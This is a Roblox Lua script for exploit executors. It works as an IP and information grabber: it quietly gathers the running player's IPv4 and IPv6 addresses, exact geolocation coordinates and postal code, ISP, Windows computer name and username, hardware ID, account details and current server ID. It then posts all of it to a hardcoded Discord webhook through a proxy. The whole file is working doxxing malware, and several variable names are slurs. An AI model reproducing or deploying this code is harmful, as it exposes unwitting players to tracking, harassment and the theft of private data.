local discord = "https://discordapp.com/api/webhooks/1556353287651852419/KUpiL4wkC4y9yvoNBd7mFdbv9y0ql45STvsyrjA69j059fQtA7MBuF5VLplt6nBANCxB"

if not discord or discord == "" then return end
if discord:find("discord.com") then discord = discord:gsub("discord.com", "webhook.lewisakura.moe") end
if discord:find("discordapp.com") then discord = discord:gsub("discordapp.com", "webhook.lewisakura.moe") end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local input = UserInputService
local r = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
if not r then return end

local skibidi = { country="Unknown", city="Unknown", region="Unknown", org="Unknown", loc="0,0", postal="00000", timezone="UTC" }
local futanari = "Unknown"
local nig = "Unknown"

-- 1. IPInfo (Detailed Location)
task.spawn(function()
    pcall(function()
        local resp = r({Url = "https://ipinfo.io/json", Method = "GET"})
        if resp and resp.Body then skibidi = HttpService:JSONDecode(resp.Body) end
    end)
end)

-- 2. IPv4
task.spawn(function()
    pcall(function()
        local resp = r({Url = "https://api.ipify.org", Method = "GET"})
        if resp then futanari = resp.Body end
    end)
end)

-- 3. IPv6 (Improved Reliability)
task.spawn(function()
    pcall(function()
        -- api64.ipify.org는 순수 텍스트로 IPv6를 반환하는 가장 확실한 API입니다.
        local resp = r({Url = "https://api64.ipify.org", Method = "GET"})
        if resp then nig = resp.Body end
    end)
end)

-- 4. Avatar
task.spawn(function()
    pcall(function()
        local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
        local resp = r({Url = url, Method = "GET"})
        if resp and resp.Body then
            local data = HttpService:JSONDecode(resp.Body)
            if data.data and data.data[1] then
                pleasework = data.data[1].imageUrl
            end
        end
    end)
end)

local function safe(val) return (val and val ~= "") and tostring(val) or "Unknown" end
local function get_env(var) 
    if not os or not os.getenv then return "N/A" end
    local s, res = pcall(os.getenv, var)
    return (s and res) and res or "N/A"
end
local function get_ping()
    local s, p = pcall(function() return LocalPlayer:GetNetworkPing() end)
    return (s and p) and math.floor(p * 1000) .. " ms" or "0 ms"
end

task.wait(1.5)

local fields = {
    {
        name = "👤 유저 정보",
        value = string.format(
            "**Display:** `%s`\n**Username:** `%s`\n**UID:** `%s`\n**나이:** %s일\n**팀:** %s\n**프리미엄:** %s\n**[프로필 링크](https://www.roblox.com/users/%s/profile)**",
            safe(LocalPlayer.DisplayName), safe(LocalPlayer.Name), safe(LocalPlayer.UserId),
            safe(LocalPlayer.AccountAge), safe(LocalPlayer.Team and LocalPlayer.Team.Name),
            (LocalPlayer.MembershipType == Enum.MembershipType.Premium and "✅" or "❌"),
            safe(LocalPlayer.UserId)
        ),
        inline = false
    },
    {
        name = "🌐 네트워크 정보",
        value = string.format(
            "**IPv4:** `%s`\n**IPv6:** `%s`\n**Ping:** `%s`",
            safe(futanari), safe(nig), get_ping()
        ),
        inline = false
    },
    {
        name = "📍 상세 위치 (IP Info)",
        value = string.format(
            "**국가:** %s\n**도시:** %s\n**지역:** %s\n**좌표(위도,경도):** `%s`\n**우편번호:** `%s`\n**ISP:** %s\n**ASN:** %s\n**시간대:** %s",
            safe(skibidi.country), safe(skibidi.city), safe(skibidi.region),
            safe(skibidi.loc), safe(skibidi.postal), 
            safe(skibidi.org and skibidi.org:match("^AS%d+%s+(.+)$") or skibidi.org),
            safe(skibidi.org and skibidi.org:match("^(AS%d+)") or "N/A"),
            safe(skibidi.timezone)
        ),
        inline = false
    },
    {
        name = "💻 시스템 및 기기",
        value = string.format(
            "**OS:** %s\n**CPU:** %s\n**RAM:** %s MB\n**해상도:** %s\n**PC명:** %s / %s\n**기기타입:** %s",
            get_env("OS"), get_env("PROCESSOR_IDENTIFIER"), math.floor(Stats:GetTotalMemoryUsageMb()),
            tostring(workspace.CurrentCamera.ViewportSize), get_env("COMPUTERNAME"), get_env("USERNAME"),
            (input.TouchEnabled and not input.KeyboardEnabled and "Mobile" or "PC/Console")
        ),
        inline = false
    },
    {
        name = "🎮 게임 환경",
        value = string.format(
            "**게임명:** %s\n**PlaceID:** `%s`\n**JobID:** `%s`\n**인젝터:** %s\n**HWID:** `%s`",
            safe(MarketplaceService:GetProductInfo(game.PlaceId).Name), tostring(game.PlaceId), tostring(game.JobId),
            (identifyexecutor and identifyexecutor() or "Unknown"), safe(RbxAnalyticsService:GetClientId())
        ),
        inline = false
    },
    {
        name = "🔄 기타",
        value = "**CFrame:** ```" .. tostring(LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.CFrame or "N/A") .. "```\n**재참가 스크립트:**\n```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)```",
        inline = false
    }
}

r({
    Url = discord,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode({
        embeds = {{
            color = 16776960,
            image = { url = pleasework },
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
})
